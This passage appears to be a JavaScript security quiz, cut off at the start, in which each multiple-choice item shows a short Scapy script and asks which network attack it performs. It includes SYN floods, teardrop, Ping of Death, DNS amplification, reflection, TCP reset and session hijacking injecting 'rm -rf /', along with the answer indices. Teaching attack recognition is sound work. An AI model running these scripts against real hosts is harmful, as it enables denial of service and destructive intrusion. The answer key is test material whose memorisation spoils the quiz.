ans, unans = sr(IP(dst=target_ip)/TCP(sport=RandShort(), dport=port_range, flags="S"), timeout=1, verbose=0)

for sent, received in ans:
    if received.haslayer(TCP) and received.getlayer(TCP).flags == 0x12:
        print(f"Port {sent.getlayer(TCP).dport} is open.")
`,
        answers: [
            "UDP Ping-Pong",
            "TCP SYN Port Scanning (Reconnaissance)",
            "TCP Reset Attack",
            "Slowloris Attack"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
An old, unpatched server crashes. The crash was triggered by the Scapy script below. What is this classic attack called?

from scapy.all import *

target_ip = "10.0.0.5"

# Send a fragmented ICMP packet with a payload so large that
# the reassembled packet size (IP total length) exceeds 65,535 bytes.
# This can crash older, vulnerable IP stacks.
send(fragment(IP(dst=target_ip)/ICMP()/("X"*66000))))
`,
        answers: [
            "Ping Flood",
            "ICMP Teardrop",
            "Ping of Death",
            "Smurf Attack"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
A legacy system becomes unstable after receiving packets from the script below. What attack does this script perform?

from scapy.all import *

target_ip = "10.0.0.5"

# First fragment of an ICMP packet
p1 = IP(dst=target_ip, id=42, flags="MF", frag=0)/ICMP()/("A"*20)
# Second fragment with an overlapping offset, which can confuse
# the reassembly logic on vulnerable systems.
p2 = IP(dst=target_ip, id=42, frag=2)/("B"*20) # frag=2 means offset 16 bytes

send(p1)
send(p2)
`,
        answers: [
            "Ping of Death",
            "ICMP Redirect",
            "TCP Session Hijacking",
            "ICMP Teardrop"
        ],
        correctAnswerIndex: 3
    },
    {
        question: `
An analyst sees the following packet being sent to multiple systems, causing some of them to crash. What is this attack?

from scapy.all import *

target_ip = "10.0.0.5"

# Create an IP packet where the protocol field is set to 0.
# Older systems might not know how to handle this and could crash.
packet = IP(dst=target_ip, proto=0)

print("Sending IP Null Attack packet...")
send(packet)
`,
        answers: [
            "IP Null Attack",
            "UDP Fraggle",
            "TCP SYN Flood",
            "Ping Flood"
        ],
        correctAnswerIndex: 0
    },
    {
        question: `
The script below is used in an attack that is very similar to a Smurf attack, but uses a different protocol. What is this attack?

from scapy.all import *

victim_ip = "192.168.1.100"
broadcast_ip = "192.168.1.255"

# Send a UDP packet to a common service port (e.g., 7, echo)
# at the network's broadcast address. The source IP is spoofed.
# All hosts on the network that have this service enabled will reply to the victim.
packet = IP(src=victim_ip, dst=broadcast_ip) / UDP(dport=7) / "Fraggle Attack"

print("Executing UDP Fraggle Attack...")
send(packet)
`,
        answers: [
            "Smurf Attack",
            "UDP Fraggle",
            "UDP Ping-Pong",
            "IP Null Attack"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
The script below initiates a Denial of Service attack by causing two servers to send traffic to each other. What is this attack?

from scapy.all import *

# Spoof packet from Victim_A to Victim_B's echo service.
# Victim_B will reply to Victim_A. If Victim_A also has an echo service,
# it will reply back to Victim_B, creating a loop.
victim_a_ip = "10.0.0.10"
victim_b_ip = "20.0.0.20"

packet = IP(src=victim_a_ip, dst=victim_b_ip) / UDP(dport=7) / "ping"

print("Initiating Ping-Pong attack...")
send(packet)
`,
        answers: [
            "TCP Reset Attack",
            "ARP Spoofing",
            "UDP Ping-Pong",
            "CAM Table Exhaustion"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
A web server's connection table is full of half-open connections, making it unavailable to legitimate users. The attack is being carried out with a script like this. What is it?

from scapy.all import *

target_ip = "10.0.0.5"
target_port = 80

# Send a flood of TCP SYN packets with spoofed source IPs.
# The server responds with SYN-ACKs to fake IPs and waits for an ACK that never comes.
# This exhausts the server's backlog queue.
packet = IP(dst=target_ip, src=RandIP())/TCP(dport=target_port, flags="S")

print("Executing SYN Flood...")
send(packet, loop=1, inter=0.01)
`,
        answers: [
            "Slowloris Attack",
            "TCP Session Hijacking",
            "TCP SYN Flood",
            "Ping of Death"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
The script below is used as part of an attack where a victim is flooded with SYN-ACK packets. What is this attack?

from scapy.all import *

victim_ip = "192.168.1.100"
reflector_ip = "8.8.8.8" # Some public server

# Send a SYN packet to a reflector, but spoof the source IP as the victim's.
# The reflector will send a SYN-ACK back to the victim.
# If done with many reflectors, the victim is flooded.
packet = IP(src=victim_ip, dst=reflector_ip) / TCP(dport=53, flags="S") # DNS port is common

print("Using reflector to send SYN-ACK to victim...")
send(packet)
`,
        answers: [
            "TCP Reset Attack",
            "TCP SYN-ACK Flood (Reflection Attack)",
            "TCP Session Hijacking",
            "Normal TCP Handshake"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
An active TCP connection between two hosts is suddenly terminated. The cause is traced to the following script. What attack is being performed?

from scapy.all import *

# Assume we sniffed the correct sequence number for an active connection
# between source_ip and dest_ip on port 80.
source_ip = "192.168.1.50"
dest_ip = "10.0.0.5"
seq_num = 123456789 # The key is getting this right

# Craft a TCP Reset packet with the correct sequence number to tear down the connection.
packet = IP(src=source_ip, dst=dest_ip) / TCP(sport=RandShort(), dport=80, flags="R", seq=seq_num)

print("Sending TCP Reset packet...")
send(packet)
`,
        answers: [
            "TCP Reset Attack",
            "TCP SYN Flood",
            "ICMP Redirect Attack",
            "ARP Spoofing"
        ],
        correctAnswerIndex: 0
    },
    {
        question: `
A firewall is being stressed by a high volume of packets generated by the script below, forcing it to process state for non-existent connections. What is this DoS attack?

from scapy.all import *

target_ip = "10.0.0.1" # Target is likely a stateful firewall or server

# Flood the target with TCP packets that have the RST (Reset) or FIN (Finish) flag set.
# This forces the target to check its state table for a connection that doesn't exist,
# consuming processing resources.
packet = IP(dst=target_ip, src=RandIP()) / TCP(dport=RandShort(), flags="R")

print("Executing RST/FIN Flood...")
send(packet, loop=1, inter=0.01)
`,
        answers: [
            "Smurf Attack",
            "TCP SYN Flood",
            "TCP RST/FIN Flood",
            "Ping of Death"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
An attacker uses the script below to inject a malicious command into a user's active Telnet session after successfully predicting the sequence numbers. What is this attack?

from scapy.all import *

# Attacker has sniffed/predicted the correct sequence numbers for a session
# between user_ip and server_ip.
user_ip = "192.168.1.10"
server_ip = "10.0.0.80"
predicted_seq = 300
predicted_ack = 500

# Inject a payload (e.g., 'rm -rf /') into the established connection.
# The server will accept this packet as part of the legitimate session.
packet = IP(src=user_ip, dst=server_ip) / TCP(sport=1025, dport=23, flags="PA", seq=predicted_seq, ack=predicted_ack) / "rm -rf /\\n"

print("Attempting to hijack session...")
send(packet)
`,
        answers: [
            "ICMP Redirect Attack",
            "TCP Session Hijacking",
            "ARP Spoofing",
            "TCP SYN Flood"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
A victim's network is saturated with DNS responses they never requested. The attack is launched using a script like the one below. What is this called?

from scapy.all import *

victim_ip = "192.168.1.100"
dns_server = "8.8.8.8" # An open DNS resolver

# Send a DNS query to a public server with the source IP spoofed to be the victim's IP.
# Requesting 'ANY' often results in a much larger response than the query,
# amplifying the traffic sent to the victim.
packet = IP(src=victim_ip, dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))

print("Executing DNS Amplification attack...")
send(packet)
`,
        answers: [
            "ICMP Teardrop",
            "DNS Reflection/Amplification Attack",
            "TCP Reset Attack",
            "Reconnaissance"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
A web server becomes unresponsive because all its connection slots are occupied by clients that never send a full request. The attack conceptually mirrors the script below, which targets Layer 4 to achieve a Layer 7 effect. What is this attack?

from scapy.all import *
import time

target_ip = "10.0.0.5"
target_port = 80
num_sockets = 200

sockets = []
for i in range(num_sockets):
    # This is a conceptual representation.
    # A real Slowloris sends partial HTTP headers over a standard socket.
    # This Scapy script simulates the "opening many connections and keeping them open" part.
    # It establishes a connection and then does nothing.
    syn = IP(dst=target_ip)/TCP(dport=target_port, flags='S')
    syn_ack = sr1(syn, verbose=0)
    if syn_ack:
        sockets.append(syn_ack)
        print(f"Connection {i+1} established...")

print("All connections open. Keeping them alive by doing nothing...")
time.sleep(600)
`,
        answers: [
            "Ping Flood",
            "TCP SYN Flood",
            "(HTTP) Slowloris Attack",
            "Ping of Death"
        ],
        correctAnswerIndex: 2
    }

];
